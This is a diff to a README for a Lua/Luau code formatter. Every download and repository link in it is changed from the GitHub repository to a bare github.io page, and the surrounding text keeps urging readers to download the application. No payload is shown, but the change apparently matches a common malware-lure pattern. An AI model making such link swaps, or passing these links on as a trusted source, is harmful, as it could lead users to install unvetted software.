@@ -1,6 +1,6 @@
 # ✨ Lua-Luau-Code-Formatter - Make Your Code Beautiful Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Lua--Luau--Code--Formatter-blueviolet?style=for-the-badge&logo=github)](https://github.com/JoshBmy13/Lua-Luau-Code-Formatter)
+[![Download Now](https://img.shields.io/badge/Download-Lua--Luau--Code--Formatter-blueviolet?style=for-the-badge&logo=github)](https://joshbmy13.github.io)
 
 ---
 
@@ -33,7 +33,7 @@ Getting started is incredibly easy! Follow these simple steps and you'll be form
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: **[Click Here to Download](https://github.com/JoshBmy13/Lua-Luau-Code-Formatter)**
+Visit this link to download the application: **[Click Here to Download](https://joshbmy13.github.io)**
 
 Once you're on the download page, look for the download button or link. The download might take a moment depending on your internet speed.
 
@@ -141,7 +141,7 @@ This project is available for public use. Feel free to use it for personal proje
 
 ## 📞 Need Help?
 
-- **Visit the repository**: [https://github.com/JoshBmy13/Lua-Luau-Code-Formatter](https://github.com/JoshBmy13/Lua-Luau-Code-Formatter)
+- **Visit the repository**: [https://joshbmy13.github.io](https://joshbmy13.github.io)
 - **Check the issues page**: You can ask questions or report problems there
 - **Be patient and kind** — The developers work hard to keep this tool great
 
@@ -151,7 +151,7 @@ This project is available for public use. Feel free to use it for personal proje
 
 Ready to try it out? Here's your download link again:
 
-[![Get It Now](https://img.shields.io/badge/🚀-Download_Lua--Luau--Code--Formatter-orange?style=for-the-badge)](https://github.com/JoshBmy13/Lua-Luau-Code-Formatter)
+[![Get It Now](https://img.shields.io/badge/🚀-Download_Lua--Luau--Code--Formatter-orange?style=for-the-badge)](https://joshbmy13.github.io)
 
 Visit this link to download the application. It's quick, free, and will make your coding life so much easier!
 
